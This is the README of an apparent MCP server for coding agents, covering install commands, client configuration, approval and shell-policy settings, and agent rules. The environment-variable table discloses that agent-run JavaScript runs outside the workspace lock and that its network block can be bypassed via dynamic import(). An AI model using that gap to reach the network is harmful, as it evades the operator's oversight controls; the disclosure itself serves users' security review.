# venira-mcp

> Fast, workspace-scoped **MCP server for coding agents** (OpenCode, Claude Desktop, any MCP client). Two tool modes — **Default** (lean 31-tool coding set) · **Expert** (full surface) — structured JSON envelopes, validated read caches, async shell, code-intelligence (outline/symbols/diff/references/selective search), **dependency graph + change impact**, fuzzy edit, SQLite recent-files index, **git-free checkpoints/rollback**, **audit reasons ("why")**, **pull requests + CI provider integrations (including bounded CI waiting)**, **encrypted secrets with rotation metadata**, **deterministic error diagnosis + read planning**, and full SQLite audit trail — **pure Node, 1 native dependency (better-sqlite3), no GUI.**

**Setup in one line** (run it in the project you want to work on, then restart your client):

```bash
npx --yes venira-mcp@latest --install auto --workspace .
```

Prefer your agent to do it? Paste the prompt from [§2.2](#22-fastest-path-paste-this-prompt-into-your-agent). New here: read [§2 Quick start](#2-quick-start); everything after it is reference.

```
┌──────────────┐   stdio (MCP)   ┌────────────────────────────────────────────┐
│ MCP client    │ ◄──────────────► │  venira-mcp (Node, single process)        │
│ (OpenCode,    │                  │  Default 31 / Expert full · async shell   │
│  Claude, ...) │                  │  SQLite audit (WAL) · p50/p95 metrics     │
└──────────────┘                  └────────────────────────────────────────────┘
```

- **1 native dependency.** Only Node ≥ 20 + `@modelcontextprotocol/sdk` + `zod` +
  `better-sqlite3`. No Rust binary, no database server, no `gh`/`git` binary for the
  API tools (`project_git` reads `.git/config` directly).
- **Network is opt-in by policy, off by switch.** File and checkpoint tools are local;
  shell commands can access the network when allowed by shell policy. Only the built-in
  `project_pr_*` / `project_ci_*` integrations are governed by `VENIRA_NETWORK=0`.
- **Workspace-locked by default.** Every path is validated inside the workspace; `../` escape
  is rejected with `path_escape`.
- **Validated read cache.** Reads are cached and re-validated by `mtime + size`, which
  detects normal external edits or deletes; it is not a filesystem transaction or watcher.
- **Async shell by default, foreground on request.** `project_shell_run` returns
  `run_id`/`shell_id` immediately by default; poll with `project_shell_status`
  (5–30 s observation window, deliberately non-queued). Pass `background: 0` (or
  `false`) when the agent needs the complete final `stdout`/`stderr` in the same call:
  it blocks until the command exits and flushes, and the agent must not start other work
  while waiting.
- **Full observability.** `project_health` reports capability state, queue depth, cache
  hit-rates, active shells, and p50/p95/max per operation.
- **Audit trail.** Operations (including failures, shell runs, and cancellations) are written
  to a SQLite WAL table (`project_tool_audit`) when the audit database is available; failures
  are surfaced explicitly. Mutations accept a `reason` ("why"), stored in the same row.
- **Checkpoints without git.** `project_snapshot` stores content-addressed copies of the
  workspace (deduplicated) and restores captured files atomically per file — roll back a risky
  refactor in one call.
- **Pull requests and CI in the same loop.** `project_pr_create` / `project_pr_comment` /
  `project_pr_merge` and `project_ci_status` / `project_ci_trigger` / `project_ci_logs` /
  `project_ci_wait` drive the configured GitHub, GitLab or Bitbucket provider APIs without
  shelling out to `gh`.
- **Dependency graph and impact analysis.** `project_dependency_graph` builds a
  deterministic TS/JS + Python + Rust graph (JSON, DOT or Mermaid) — Rust module
  declarations (`mod`, `pub mod`), `use crate::`/`super::`, `extern crate`, crate-root
  relative paths resolved through the rustc file layout (`foo.rs` vs `foo/mod.rs`, crate
  root via `main.rs`/`lib.rs`) — and `project_change_impact` answers "what breaks if I
  edit this?" with a bounded reverse/forward closure, confidence per hit and a separate
  `tests_affected` count.
- **Secrets are kept out of normal tool metadata.** `project_secret` keeps tokens encrypted
  (AES-256-GCM) at rest and `secret_env` avoids putting them in command arguments; stored
  values are scrubbed from shell tails/audit text on a best-effort basis. Explicit reveal is
  opt-in, but code receiving a secret can transform or exfiltrate it; review before approval.

## 1. Table of contents

- [Quick start](#2-quick-start)
- [MCP client configuration (JSON)](#3-mcp-client-configuration-json)
- [Tools](#4-tools)
- [Architecture](#5-architecture)
- [Security model](#6-security-model)
- [Benchmark](#7-benchmark)
- [Envelopes, hints, and error codes](#8-envelopes-hints--error-codes)
- [Pros / cons (honest)](#9-what-this-project-does-well--what-it-does-not)
- [Interesting details](#10-interesting-details--things-you-should-know)
- [Development workflow](#11-development-workflow)
- [Troubleshooting](#12-troubleshooting)
- [Contributing](#13-contributing)
- [Changelog & roadmap](#14-changelog--roadmap)
- [CI/CD](./CI-CD.md)
- [Docker](./DOCKER.md)

---

## 2. Quick start

### 2.1 Prerequisites

| Requirement | Version | Notes |
|---|---|---|
| Node.js | ≥ 20.0 | Runtime; audit storage uses `better-sqlite3` |
| Git | any | — |

Nothing else: no clone, no build, no external binary. `npx` downloads the
package on first run (10–25 s, mostly the SQLite native binding).

### 2.2 Fastest path: paste this prompt into your agent

Open your AI coding agent **in the project you want Venira to work on**, paste
this, and let it wire things up:

```text
Set up Venira MCP for this workspace.

1. Detect my MCP client and its exact config path. If you are not sure, ask me
   instead of guessing.
2. Run: npx --yes venira-mcp@latest --install auto --workspace .
   If it reports that nothing was detected, run:
   npx --yes venira-mcp@latest --print-config <my-client>
   and merge the printed entry into the config path from step 1. Keep every
   other server in that file untouched.
3. Never put a token, key, or secret in the MCP config.
4. Tell me to restart the client, then stop. Do not claim the connection is
   verified before that restart.
```

The prompt stops at the restart boundary on purpose: most clients only load MCP
servers at startup, so nothing can be verified before the restart.

### 2.3 Or run one command yourself

```bash
# Run from the project you want Venira to work on
npx --yes venira-mcp@latest --install auto --workspace .
```

`--install auto` merges Venira into every MCP client config it can find, backs
up the original as `<file>.venira-bak`, and never removes other servers. Then
restart the client.

| Situation | Command |
|---|---|
| Nothing detected, or you want a specific client | `npx --yes venira-mcp@latest --install opencode` |
| You prefer to paste the JSON yourself | `npx --yes venira-mcp@latest --print-config opencode` |
| See what would change without writing | `npx --yes venira-mcp@latest --install auto --dry-run` |

Client names: `vscode`, `opencode`, `claude_desktop`, `cursor`, `codex`, `kimi`,
`deepseek`, `antigravity`. Naming a client creates its config when missing;
`auto` only touches configs that already exist.

### 2.4 Restart, then verify

Restart the client (VS Code: reload the window), then ask the agent:

```text
Call project_health and tell me whether Venira is connected.
```

A healthy connection returns `ok: true` plus the workspace path, data dir and
tool counts. That is the only real proof — a config file on disk is not.

### 2.5 Command cheat sheet

| Command | When to use it |
|---|---|
| `npx --yes venira-mcp@latest --install auto --workspace .` | First-time setup; merges detected configs |
| `npx --yes venira-mcp@latest --print-config <client>` | Print a config instead of writing it |
| `npx --yes venira-mcp@latest --doctor` | Preflight: workspace, data dir, tools, shell |
| `npx --yes venira-mcp@latest --setup-github` | Store a GitHub token once (interactive terminal) |
| `npx --yes venira-mcp@latest --version` | Print the version (current release: 1.13.8) |
| `npx --yes venira-mcp@latest --help` | All flags and environment variables |
| `npx --yes venira-mcp@latest --verify` | Behavioural regression suite |

A global install is optional: `npm i -g venira-mcp` exposes `venira` and
`venira-mcp`, so `venira --install auto --workspace .` replaces the long form.
Without it, name the package explicitly: `npx --yes -p venira-mcp venira`.

### 2.6 Developers and containers

```bash
git clone https://github.com/N0moreher0/Venira-mcp.git venira-mcp
cd venira-mcp
npm install
npm run build          # tsc → dist/
npm start              # stdio MCP server
```

Docker (no Node on the host):

```bash
docker run --rm -it -v "$PWD:/workspace" ghcr.io/n0moreher0/venira-mcp:latest
```

See [`DOCKER.md`](./DOCKER.md) for multi-arch builds and Docker wiring.
After `npm install`, the local checks are `npm run smoke`, `npm run doctor`,
`npm run verify`, `npm run bench:mcp`.

---

## 3. MCP client configuration (JSON)

### 3.0 Supported clients

Most users can stop after [§2.2](#22-fastest-path-paste-this-prompt-into-your-agent)–[§2.3](#23-or-run-one-command-yourself).
This table is the reference for manual edits. For the values that keep the agent
loop fast without giving up the guardrails, copy the profile in
[§3.4](#34-recommended-setup-for-agents-copy-paste).

| Client | Config file | Entry key |
|---|---|---|
| VS Code | `<workspace>/.vscode/mcp.json` | `servers` + `type: "stdio"` |
| OpenCode | `~/.config/opencode/opencode.jsonc` or `.opencode/opencode.jsonc` | `mcp` + `type: "local"` |
| Claude Desktop | `%APPDATA%\Claude\claude_desktop_config.json` (Windows) · `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS) · `~/.config/Claude/claude_desktop_config.json` (Linux) | `mcpServers` |
| Cursor | `%APPDATA%\Cursor\mcp.json` (Windows) · `~/Library/Application Support/Cursor/mcp.json` (macOS) · `~/.config/Cursor/mcp.json` (Linux) | `mcpServers` |
| Codex CLI | `~/.codex/config.toml` | `[mcp_servers.venira]` (TOML) |
| Kimi | `~/.kimi/mcp.json` | `mcpServers` |
| DeepSeek | `~/.deepseek/mcp.json` | `mcpServers` |
| Antigravity | `~/.antigravity/config.json` | `mcpServers` |

### 3.1 VS Code (`.vscode/mcp.json`)

```json
{
  "servers": {
    "venira": {
      "type": "stdio",
      "command": "npx",
      "args": ["--yes", "--package=venira-mcp@latest", "venira-mcp"],
      "env": {
        "VENIRA_WORKSPACE": "${workspaceFolder}",
        "VENIRA_UNRESTRICTED": "0",
        "VENIRA_SHELL_MODE": "balanced",
        "VENIRA_PERMISSION_MODE": "allow_all",
        "VENIRA_OUTPUT_MODE": "full"
      }
    }
  }
}
```

Generate this file automatically with
`npx --yes venira-mcp@latest --install vscode --workspace .`, or print it with
`--print-config vscode`. Leave `VENIRA_DATA_DIR` unset so the MCP client and
`--setup-github` share the same per-user vault. Leave `VENIRA_DEFAULT_SHELL`
unset too; the server detects `powershell`/`cmd`/`bash` for the host OS.

`npx` downloads and runs the package; a global npm install is not required. After
saving the file, start or restart the Venira server in VS Code, then ask the agent
to call `project_health`.

To authorize GitHub, run this yourself in a terminal (the hidden prompt is
interactive, so an agent cannot type it for you):

```bash
npx --yes venira-mcp@latest --setup-github
```

This securely asks for a GitHub token and saves it in your encrypted local vault.
Alternatively, after Venira is connected in VS Code, ask the agent to **connect
GitHub**; approve the GitHub link and code, then tell the agent you are done. The
token is never shown in chat or saved in MCP config.

### 3.2 OpenCode (`opencode.jsonc` or `.opencode/opencode.jsonc`)

The simplest form (uses `npx`, no local install needed). Use an absolute
workspace path — OpenCode does not expand `${workspaceFolder}`:

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "mcp": {
    "venira": {
      "type": "local",
      "command": ["npx", "--yes", "--package=venira-mcp@latest", "venira-mcp"],
      "enabled": true,
      "environment": {
        "VENIRA_WORKSPACE": "/absolute/path/to/your-project",
        "VENIRA_UNRESTRICTED": "0",
        "VENIRA_SHELL_MODE": "balanced",
        "VENIRA_PERMISSION_MODE": "allow_all",
        "VENIRA_OUTPUT_MODE": "full"
      }
    }
  }
}
```

Generate it with
`npx --yes venira-mcp@latest --install opencode --workspace .` or
`--print-config opencode`. On Windows the path needs escaped backslashes
(`C:\\path\\to\\your-project`). Leave `VENIRA_DATA_DIR` and
`VENIRA_DEFAULT_SHELL` unset to use OS defaults; see
[§3.5](#35-environment-variables-full-reference) for every variable.

For a local build (after `git clone` + `npm install` + `npm run build`), replace
the command with `["node", "/absolute/path/to/venira-mcp/dist/server.js"]`.

> This repo ships a ready-to-edit copy at [`opencode.example.json`](./opencode.example.json).

### 3.3 Claude Desktop / any MCP client (`claude_desktop_config.json` or `.mcp.json`)

Path per client: see [§3.0](#30-supported-clients). The same shape works for
Claude Desktop, Cursor, Kimi, DeepSeek and Antigravity:

```json
{
  "mcpServers": {
    "venira": {
      "command": "npx",
      "args": ["--yes", "--package=venira-mcp@latest", "venira-mcp"],
      "env": {
        "VENIRA_WORKSPACE": "/absolute/path/to/your-project",
        "VENIRA_UNRESTRICTED": "0",
        "VENIRA_SHELL_MODE": "balanced",
        "VENIRA_PERMISSION_MODE": "allow_all",
        "VENIRA_OUTPUT_MODE": "full"
      }
    }
  }
}
```

Use `--print-config claude_desktop` (or the matching client name) to generate the
exact JSON/TOML for your OS. On Windows, JSON paths need escaped backslashes
(`C:\\path\\to\\your-project`). Leave `VENIRA_DATA_DIR` and
`VENIRA_DEFAULT_SHELL` unset to use the OS defaults.

> For a local build (not yet published to npm), use
> `"command": "node", "args": ["/absolute/path/to/venira-mcp/dist/server.js"]`
> instead of `npx`.

For the agent-facing setup prompt, see
[§2.2](#22-fastest-path-paste-this-prompt-into-your-agent). It applies to every
client listed above.

### 3.4 Recommended setup for agents (copy-paste)

The defaults already work. This profile is what the agent loop is tuned for: one
shared vault, the workspace lock on, the shell policy in `balanced`, and human
approval only where the blast radius is real. Copy the block for your client,
restart it, then ask the agent to call `project_health`.

**Why these values**

| Variable | Value | Effect on the agent loop |
|---|---|---|
| `VENIRA_WORKSPACE` | absolute path | Every relative path and the shell cwd resolve from here, so the agent never has to guess a root. |
| `VENIRA_UNRESTRICTED` | `"0"` | Escapes fail fast with `path_escape` plus a hint instead of silently reading outside the project. |
| `VENIRA_SHELL_MODE` | `"balanced"` | Routine read-only commands run without a prompt; network, outside-workspace writes, `git push` and history rewrites stop for approval. `strict` adds prompts to almost everything; `permissive` removes the guardrail. |
| `VENIRA_PERMISSION_MODE` | `"allow_all"` | Opens the session capability as `allow_all`. The enforced gates are the workspace lock, shell policy and approvals, not this label. |
| `VENIRA_OUTPUT_MODE` | `"full"` | Complete envelopes, so an agent never re-reads a file because a payload was trimmed. Use `"compact"` only for small-context models. |
| `VENIRA_SHELL_EXIT_EARLY` | `"1"` | `project_shell_status` returns the moment the exit code is known instead of sleeping out the full `wait_seconds` window. |
| `VENIRA_ALLOW_JS_EXEC` | `"0"` | Keeps the arbitrary-code path off. Turn it on only for a task that genuinely needs it; `VENIRA_JS_EXEC_APPROVAL="1"` still makes every snippet wait for your grant. |
| `VENIRA_JS_EXEC_APPROVAL` | `"1"` | Per-call human approval for `project_execute_js`, bound to the exact code + `argv` and single-use. |
| `VENIRA_ALLOW_SELF_INSTALL` | `"0"` | An agent cannot rewrite MCP configs for other clients on its own. |
| `VENIRA_DATA_DIR` | unset | The server, `npx venira-mcp --approve` and `--setup-github` must share one vault; override it only if you override it everywhere. |
| `VENIRA_NETWORK` | `"1"` | GitHub/CI tools work. Use `"0"` for an offline repo: every outbound call is refused before a socket opens. |
| `VENIRA_TOOL_MODE` | `"expert"` | The recommended profile assumes the full surface (shell, builds, CI/CD). Set `"default"` for a coding-only agent: no shell execution, no JS eval, no CI/CD shipping, no destructive deletes. |

Leave the cache and audit flags alone: `VENIRA_CACHE_ALL`,
`VENIRA_CACHE_LIST_ONLY`, `VENIRA_CACHE_SEARCH_ONLY` and `VENIRA_AUDIT_FAST`
already default to `1`.

**OpenCode** — `~/.config/opencode/opencode.jsonc` (absolute path; OpenCode does
not expand `${workspaceFolder}`):

```jsonc
{
  "$schema": "https://opencode.ai/config.json",
  "mcp": {
    "venira": {
      "type": "local",
      "command": ["npx", "--yes", "--package=venira-mcp@latest", "venira-mcp"],
      "enabled": true,
      "environment": {
        "VENIRA_WORKSPACE": "/absolute/path/to/your-project",
        "VENIRA_UNRESTRICTED": "0",
        "VENIRA_SHELL_MODE": "balanced",
        "VENIRA_PERMISSION_MODE": "allow_all",
        "VENIRA_OUTPUT_MODE": "full",
        "VENIRA_SHELL_EXIT_EARLY": "1",
        "VENIRA_ALLOW_JS_EXEC": "0",
        "VENIRA_JS_EXEC_APPROVAL": "1",
        "VENIRA_ALLOW_SELF_INSTALL": "0",
        "VENIRA_NETWORK": "1",
        "VENIRA_TOOL_MODE": "expert"
      }
    }
  }
}
```

**VS Code** — `<workspace>/.vscode/mcp.json`; `${workspaceFolder}` is expanded
here, so no path edit is needed:

```json
{
  "servers": {
    "venira": {
      "type": "stdio",
      "command": "npx",
      "args": ["--yes", "--package=venira-mcp@latest", "venira-mcp"],
      "env": {
        "VENIRA_WORKSPACE": "${workspaceFolder}",
        "VENIRA_UNRESTRICTED": "0",
        "VENIRA_SHELL_MODE": "balanced",
        "VENIRA_PERMISSION_MODE": "allow_all",
        "VENIRA_OUTPUT_MODE": "full",
        "VENIRA_SHELL_EXIT_EARLY": "1",
        "VENIRA_ALLOW_JS_EXEC": "0",
        "VENIRA_JS_EXEC_APPROVAL": "1",
        "VENIRA_ALLOW_SELF_INSTALL": "0",
        "VENIRA_NETWORK": "1",
        "VENIRA_TOOL_MODE": "expert"
      }
    }
  }
}
```

**Claude Desktop, Cursor, Kimi, DeepSeek, Antigravity** — same `mcpServers`
shape (config path per client: [§3.0](#30-supported-clients)):

```json
{
  "mcpServers": {
    "venira": {
      "command": "npx",
      "args": ["--yes", "--package=venira-mcp@latest", "venira-mcp"],
      "env": {
        "VENIRA_WORKSPACE": "/absolute/path/to/your-project",
        "VENIRA_UNRESTRICTED": "0",
        "VENIRA_SHELL_MODE": "balanced",
        "VENIRA_PERMISSION_MODE": "allow_all",
        "VENIRA_OUTPUT_MODE": "full",
        "VENIRA_SHELL_EXIT_EARLY": "1",
        "VENIRA_ALLOW_JS_EXEC": "0",
        "VENIRA_JS_EXEC_APPROVAL": "1",
        "VENIRA_ALLOW_SELF_INSTALL": "0",
        "VENIRA_NETWORK": "1",
        "VENIRA_TOOL_MODE": "expert"
      }
    }
  }
}
```

**Codex CLI** — `~/.codex/config.toml` (TOML; escape Windows path backslashes):

```toml
[mcp_servers.venira]
command = "npx"
args = ["--yes", "--package=venira-mcp@latest", "venira-mcp"]
startup_timeout_sec = 120

[mcp_servers.venira.env]
VENIRA_WORKSPACE = "C:\\path\\to\\your-project"
VENIRA_UNRESTRICTED = "0"
VENIRA_SHELL_MODE = "balanced"
VENIRA_PERMISSION_MODE = "allow_all"
VENIRA_OUTPUT_MODE = "full"
VENIRA_SHELL_EXIT_EARLY = "1"
VENIRA_ALLOW_JS_EXEC = "0"
VENIRA_JS_EXEC_APPROVAL = "1"
VENIRA_ALLOW_SELF_INSTALL = "0"
VENIRA_NETWORK = "1"
VENIRA_TOOL_MODE = "expert"
```

`npx --yes venira-mcp@latest --print-config <client>` prints the minimal shape
from §3.1–§3.3; add the extra variables above to its `environment`/`env` block
(or merge them by hand). `--install <client>` writes the same minimal entry.
This repo keeps a ready OpenCode copy at
[`opencode.example.json`](./opencode.example.json).

**Agent instructions**

Config decides what the server *allows*; these rules decide how the model
*spends* it. Paste them into `AGENTS.md`, `CLAUDE.md`, or the client's system
prompt:

```text
Venira MCP rules:
1. Unfamiliar task: call project_plan_read_batch, then run steps[0] before
   reading anything else.
2. Read with project_read_batch (up to 8 items) and project_read_ranges for big
   files. Never re-read a file a tool already returned in this session.
3. Prefer project_edit_file / project_edit_batch over project_write_file, and
   pass `reason` on every mutation so the audit trail explains why.
4. Snapshot before multi-file or destructive changes (project_snapshot create).
5. Short commands: project_shell_run with background: 0. Long jobs: background: 1
   then project_shell_status; stop polling once running is false.
6. Do not call project_execute_js unless the user asked for JavaScript; it needs
   a per-call approval.
7. On failure, follow the envelope's hint instead of repeating the same call.
   Treat ok:false with retryable:false as final and explain it to the user.
8. Report only what the tool returned; never claim a change without a successful
   envelope.
```

**Code Mode rules** (OpenCode `execute` tool):

```text
Venira Code Mode rules:
- search({ query, limit?, offset? }) is synchronous: never await it, and never
  pass a bare string — always pass an object.
- Every tools.<server>.<tool>(...) call returns a Promise: always await it.
- If execute throws SchemaError or "un-awaited Promise", fix the call shape once.
  Do not retry the identical code.
```

### 3.5 Environment variables (full reference)

| Variable | Default | Description |
|---|---|---|
| `VENIRA_WORKSPACE` | `process.cwd()` | Root of the workspace. All relative paths resolve against this; absolute paths outside it are rejected unless unrestricted. |
| `VENIRA_DATA_DIR` | Windows: `%LOCALAPPDATA%\\venira`; macOS: `~/Library/Application Support/venira`; Linux: `~/.local/share/venira` | Where the audit DB, encrypted secrets, approval key and pending approvals are stored. Set an explicit per-user directory when needed. |
| `VENIRA_SESSION_GRANT_RULES` | `cd_outside_workspace` | Comma-separated additional policy rules that may receive a human-approved session grant. Use sparingly; session grants do not apply to `network_access` or `git_history_rewrite` by default. |
| `VENIRA_UNRESTRICTED` | `"0"` | `"1"` disables workspace locking (absolute paths anywhere work). **Do not set in production.** |
| `VENIRA_SECRET_KEYCHAIN` | `"auto"` | On Windows, `"auto"` uses the optional Windows Credential Manager (`keytar`) for new secret-store keys when available; `"off"` forces `secrets.key`; `"required"` fails closed if Credential Manager is unavailable. Existing file-backed stores remain compatible. |
| `VENIRA_DEFAULT_SHELL` | platform default | `powershell` / `cmd` / `bash` used when `project_shell_run` receives no `shell` argument. |
| `VENIRA_PERMISSION_MODE` | `"allow_all"` (MCP standalone) | `"manual"` / `"best_effort"` / `"allow_all"` permission mode for coding tool calls; this is separate from shell policy and does not grant shell overrides. HMAC approval tokens/session grants are scoped to the running process and do not survive a restart. |
| `VENIRA_ALLOW_JS_EXEC` | `"0"` | `"1"` enables optional `project_execute_js`. Note: `project_execute_js` runs outside shell policy and the workspace lock, so it can still read protected files inside the workspace; stdout/stderr are redacted and global `fetch`/`WebSocket` plus CommonJS net modules are blocked, but network blocking is best-effort (a dynamic `import()` can bypass it). Review code before enabling. Default off starting v1.7.0. |
| `VENIRA_JS_EXEC_APPROVAL` | `"1"` | When `project_execute_js` is enabled, every call needs a human grant by default: the first call returns `approval_required` with an `approval_id`, and the user runs `npx venira-mcp --approve <id>` in a terminal before the agent retries with that id. Grants are bound to the exact code + `argv` and are single-use. Set `"0"` only for trusted automation (restores pre-v1.12 behaviour). |
| `VENIRA_SHELL_MODE` | `balanced` | `balanced` asks on high risk · `strict` uses an allowlist and asks otherwise · `permissive` skips ordinary ask rules. Hard-deny and protected-file rules stay active in every mode; Git history rewrites still ask unless the operator-enabled `ALLOW_GIT_PUSH` override is passed, and `.env` reads need the narrow `ALLOW_ENV_READ` override. Only these three values are accepted. |
| `VENIRA_SHELL_OVERRIDES` | unset | Operator allowlist for named exceptions: `ALLOW_GIT_PUSH`, `ALLOW_ENV_READ`. Each call must also pass the exact `override` name and a non-empty `reason`; no wildcard/global bypass exists. |
| `VENIRA_SHELL_POLICY_FILE` | unset | **Explicit** path to a JSON policy (`{ mode, allow[], ask[], deny[] }`). Never read from the workspace, so a cloned repo cannot ship its own permissive policy. |
| `VENIRA_SHELL_APPROVAL_TTL_MS` | `600000` (10 min) | Lifetime of approval tokens and session grants. |
| `VENIRA_SHELL_ELICIT` | `"0"` | `"1"` = ask the user through MCP elicitation (when the client supports it) instead of only returning `approval_required`. |
| `VENIRA_SHELL_MAX_OUTPUT_BYTES` | `1048576` (1 MiB) | Per-stream cap; the excess is dropped and reported as `dropped_bytes`. |
| `VENIRA_SHELL_MAX_TIMEOUT_MS` | `1800000` (30 min) | Upper bound for `timeout_ms`; unset or `0` uses the default 10-minute shell timeout. |
| `VENIRA_SHELL_ENV_PASS_ALL` | `"0"` | `"1"` passes the full parent environment to the child. Default: allow list only, so agent secrets never reach a command. |
| `VENIRA_SHELL_ENV_ALLOW` | unset | Extra comma-separated env var names to pass through (e.g. `GITHUB_TOKEN`). |
| `VENIRA_SHELL_CACHE` | `"1"` | 5 s LRU for read-only command output (max 100 entries). `"0"` disables it entirely. |
| `VENIRA_SHELL_CACHE_READ_ONLY` | `"1"` | `"1"` (default) limits the command cache to genuinely read-only commands, decided on the parsed argv — `git` read subcommands (`status`/`log`/`diff`/`show`/`branch`/`tag` listings, …), `rg`, `ls`, file readers, version probes. Compound commands (pipes, redirection, chains, substitutions) are never cached. `"0"` restores the legacy cache-everything behaviour (not recommended). |
| `VENIRA_DISABLE_TOOLS` | unset | Comma-separated tool names to keep out of `tools/list` entirely (e.g. `project_shell_run,project_delete_path`). |
| `VENIRA_TOOL_MODE` | `default` | Two modes, layered on top of `VENIRA_DISABLE_TOOLS` / `VENIRA_PROFILE=core`. `default` = lean coding set (31 tools): no `project_shell_run` / `project_shell_status` / `project_shell_cancel` / `project_shell_cancel_session`, no `project_execute_js`, no `project_delete_path`, no `project_pr_*` / `project_ci_*` (CI/CD shipping). `expert` = the full surface (46 tools; 47 with `VENIRA_ALLOW_JS_EXEC=1`). Also settable as `toolMode` (`"default"` \| `"expert"`) in `venira.config.json`; the env wins over the config. |
| `VENIRA_OUTPUT_MODE` | `full` | `full` = complete payloads · `compact` = trim payloads over 8 KB. Measured (this repo, Windows): a 64 KB file read drops ~87 % (70 KB → 9.4 KB); search/health/references stay byte-identical (small payloads are never trimmed). `summary` is no longer accepted. |
| `VENIRA_PRETTY` | `"0"` | `"1"` = 2-space pretty JSON in tool results. |
| `VENIRA_SESSION_ID` | auto (`opencode-<pid>-<rand>`) | Session tag; audit rows are grouped by it. Useful for verification / parallel test runs. |
| `VENIRA_READ_CACHE_BYTES` | `67108864` (64 MiB) | Budget for read + info caches. |
| `VENIRA_LIST_CACHE_MS` | `1500` | TTL for directory listing cache. |
| `VENIRA_SEARCH_CACHE_MS` | `3000` | TTL for search result cache. |
| `VENIRA_RECENT_CACHE_MS` | `2000` | TTL for recent-files cache. |
| `VENIRA_BATCH_ITEM_BYTES` | `524288` (512 KB) | Per-item cap inside `project_read_batch`. |
| `VENIRA_CACHE_ALL` | `"1"` (on) | P1: `"0"` disables **every** read-side cache (strict "always fresh" mode). |
| `VENIRA_CACHE_LIST_ONLY` | `"1"` (on) | P1: `"0"` disables only the `list_files` TTL cache. |
| `VENIRA_CACHE_SEARCH_ONLY` | `"1"` (on) | P1: `"0"` disables only the `search` TTL cache. |
| `VENIRA_TRACE` | `"0"` | P1: `"1"` logs every tool call (op, args, ms, cached, ok/fail) to stderr. |
| `VENIRA_TRACE_FILE` | unset | P1: write trace logs to a file instead of stderr. |
| `VENIRA_SHELL_TAIL_MAX` | `4000` | P1: tail buffer cap in bytes for `project_shell_run`/`status` output. |
| `VENIRA_SHELL_EXIT_EARLY` | `"0"` | P1: `"1"` — `project_shell_status` returns as soon as the exit code is known, without waiting out the full `wait_seconds` window. |
| `VENIRA_SHELL_TIMEOUT_POLICY` | `soft` | P1: `soft` (default) = an expired command only warns and is left to finish; `hard` = kill the whole process tree at the timeout. |
| `VENIRA_EDIT_FUZZY` | `"0"` | P2: `"1"` enables fuzzy matching in `project_edit_file` (Levenshtein fallback when the exact `old_text` is not found). |
| `VENIRA_SNAPSHOT_KEEP` | `20` | Checkpoints kept before the oldest are pruned (and unreferenced blobs garbage-collected). |
| `VENIRA_SNAPSHOT_MAX_FILES` | `4000` | Per-checkpoint file cap; exceeding it marks the checkpoint `truncated` (never silent). Per-workspace override: `snapshot.maxFiles` in `venira.config.json` (may raise the cap; hard ceiling 20000). |
| `VENIRA_SNAPSHOT_MAX_FILE_BYTES` | `33554432` (32 MiB) | Files larger than this are skipped and reported in `skipped[]`. |
| `VENIRA_SNAPSHOT_MAX_BYTES` | `536870912` (512 MiB) | Per-checkpoint logical byte cap (the caller can lower it, never raise it). |
| `VENIRA_NETWORK` | `"1"` | `"0"` is a hard kill switch: `project_pr_*` / `project_ci_*` return `network_disabled` and never open a socket. |
| `VENIRA_GIT_PROVIDER` | inferred | `github` \| `gitlab` \| `bitbucket`. When unset, inferred from the `origin` remote host (`github.com` → github, `gitlab` → gitlab, `bitbucket` → bitbucket). |
| `VENIRA_GIT_API_URL` | per provider | Override API base: GitHub `https://api.github.com` · GitLab `https://gitlab.com/api/v4` · Bitbucket `https://api.bitbucket.org/2.0`. Must be https (localhost ok, or `VENIRA_GIT_ALLOW_HTTP=1`). |
| `VENIRA_GIT_ALLOW_HTTP` | unset | `"1"` allows a non-https API base (local test servers only). |
| `VENIRA_GIT_REPO` | unset | Fallback `owner/name` when the caller omits `repo`. Resolution: arg → this env → `git.repo` in `venira.config.json` → `.git/config` `origin` URL. |
| `VENIRA_GIT_TOKEN` | unset | Fallback token when no provider-specific secret is found. Resolution chain: `VENIRA_GIT_TOKEN` → `VENIRA_GITHUB_TOKEN`/`GITHUB_TOKEN`/`GH_TOKEN` (GitHub) → `VENIRA_GITLAB_TOKEN`/`GITLAB_TOKEN`/`GL_TOKEN` (GitLab) → `VENIRA_BITBUCKET_TOKEN`/`BITBUCKET_TOKEN`/`BB_TOKEN` (Bitbucket) → secret store (`GITHUB_TOKEN`, `GITLAB_TOKEN`, `BITBUCKET_TOKEN` by provider). |
| `VENIRA_GIT_SECRET_NAME` | per provider | Name of the secret in the encrypted store (`GITHUB_TOKEN` \| `GITLAB_TOKEN` \| `BITBUCKET_TOKEN`). |
| `VENIRA_GIT_USERNAME` | unset | Bitbucket Basic auth username (when set, token is used as app password). |
| `VENIRA_GIT_TIMEOUT_MS` | `60000` | Request timeout (1 s – 600 s, capped). |
| `VENIRA_GIT_LOG_TIMEOUT_MS` | `90000` | Log download timeout (1 s – 900 s, capped). |
| `VENIRA_GIT_MAX_BYTES` | `8388608` (8 MB) | Response body cap for API calls (1 KB – 64 MB, capped). |
| `VENIRA_GIT_LOG_MAX_BYTES` | `524288` (512 KB) | Text output cap for logs (1 KB – 4 MB, capped). |
| `VENIRA_GIT_LOG_ZIP_BYTES` | `33554432` (32 MB) | ZIP download cap for run logs (1 KB – 128 MB, capped). |
| `VENIRA_GIT_LOG_ENTRY_BYTES` | `4194304` (4 MB) | Per-entry cap inside log archives (1 KB – 32 MB, capped). |
| `VENIRA_GIT_LOG_TEXT_BYTES` | `8388608` (8 MB) | Concatenated text cap for log output (1 KB – 32 MB, capped). |
| `VENIRA_GIT_MAX_REDIRECTS` | `5` | Max redirects per request (0 – 10, capped). |
| `VENIRA_GIT_RETRIES` | `1` | GET retries on 5xx/network error (0 – 3, capped). |
| `VENIRA_GIT_PROXY` | from `HTTPS_PROXY` | Explicit HTTPS proxy (CONNECT tunnel); overrides `HTTPS_PROXY`/`HTTP_PROXY`. `NO_PROXY` matching supported. |
| `VENIRA_GITHUB_API_URL` | `https://api.github.com` | Legacy alias for `VENIRA_GIT_API_URL` (GitHub only). |
| `VENIRA_GITHUB_ALLOW_HTTP` | unset | Legacy alias for `VENIRA_GIT_ALLOW_HTTP`. |
| `VENIRA_GITHUB_REPO` | unset | Legacy alias for `VENIRA_GIT_REPO`. |
| `VENIRA_GITHUB_TOKEN` | unset | Legacy alias for `VENIRA_GIT_TOKEN` (GitHub only). |

---

## 4. Tools

